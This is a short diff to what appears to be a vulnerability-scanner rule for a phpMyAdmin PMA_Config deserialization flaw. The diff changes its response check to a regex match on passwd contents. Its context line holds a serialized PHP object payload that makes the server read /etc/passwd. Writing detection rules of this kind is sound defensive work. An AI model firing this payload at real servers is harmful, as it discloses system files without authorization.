@@ -6,7 +6,7 @@ rules:
       action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}
     follow_redirects: false
     expression: >-
-      status==200 && body.bcontains(b'root:x:0:0')
+      status==200 && r'root:[x*]:0:0:'.bmatches(body)
 detail:
   author: p0wd3r
   links:
